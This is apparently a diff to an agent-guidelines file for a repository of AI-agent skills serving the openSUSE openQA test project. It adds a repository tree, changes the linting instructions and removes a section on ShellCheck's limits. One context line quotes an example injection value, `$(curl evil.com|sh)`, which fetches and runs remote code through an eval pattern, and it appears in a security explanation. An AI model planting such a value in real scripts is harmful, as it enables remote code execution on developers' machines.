@@ -5,9 +5,9 @@ commands** for the `os-autoinst-distri-opensuse` (OSADO) project. It is
 packaged as a Gemini CLI extension and also supports OpenCode, Claude Code,
 and Pi Agent via the [Agent Skills open standard](https://agentskills.io).
 
-Your focus is on creating, refining, and validating skills that help OSADO
-developers. See `README.md` for installation options and user-facing
-documentation.
+Your focus is on creating, refining, validating and distributing
+ skills that help OSADO developers.
+See `README.md` for installation options and user-facing documentation.
 
 ## 1. Build, Lint, and Test
 
@@ -22,8 +22,9 @@ make clean             # remove test artifacts
 Always run `make test` before committing. Run `make test-integration` when
 modifying skills or the install script.
 
-Linting: `shellcheck` is enforced on all `.sh` files. Ensure valid YAML
-frontmatter in all `SKILL.md` files.
+Linting: `make lint`.
+
+Ensure valid YAML frontmatter in all `SKILL.md` files.
 
 ## 2. Code Style
 
@@ -54,6 +55,39 @@ frontmatter in all `SKILL.md` files.
 *   Use `"""` for multi-line prompts and `!{shell command}` for dynamic context.
 
 ## 3. Architecture
+
+
+### Repository Structure
+
+```
+.
+├── gemini-extension.json    # Extension manifest (for native Gemini install)
+├── .claude-plugin/          # Plugin manifest (for native Claude Code install)
+│   ├── plugin.json
+│   └── marketplace.json
+├── ocx/                     # OCX registry (for OCX extension manager)
+│   ├── registry.jsonc       #   Source manifest (v2 schema)
+│   └── files/skills -> ../../skills  #   Symlink for ocx build
+├── OSADO_AGENTS.md          # Agent guidelines deployed to OSADO (context + workflow)
+├── skills/                  # Agent skills (SKILL.md + scripts)
+│   ├── local-lint-test/
+│   ├── vr-planner/
+│   ├── test-catalog/
+│   ├── openqa-log-analyzer/
+│   ├── git-commit/
+│   ├── github-pr-create/
+│   └── unit-test-wizard/
+├── commands/                # Custom commands (Gemini CLI only, TOML)
+│   └── osado/
+│       ├── git_commit.toml
+│       └── github_pr_create.toml
+├── tools/
+│   └── install.sh           # Multi-harness installer (opencode/gemini/claude/agents)
+├── t/                       # Test suite
+├── docs/                    # Project documentation
+│   └── pages/index.html     #   GitHub Pages landing page
+└── ideas/                   # Research and working artifacts
+```
 
 ### Distribution Model
 This repository supports multiple installation strategies:
@@ -147,13 +181,3 @@ this value and emits `MAINTAINER_VALUE="$(curl evil.com|sh)"`. The shell
     Makefile. SC2154 warnings ("referenced but not assigned") often indicate
     an `eval` pattern and must be resolved structurally, not suppressed.
 
-### ShellCheck Limitations
-
-ShellCheck is a static syntax linter, **not** a taint-analysis tool. It
-**cannot** detect:
--   `eval` injection when the variable is properly quoted (`eval "$var"`)
--   Data flow from file content through awk/sed into shell variable assignment
--   Word splitting in `for` loop contexts (intentionally suppressed by SC2086)
-
-Do not treat a clean shellcheck run as proof of security. Any script that
-reads untrusted file content requires manual review for the patterns above.
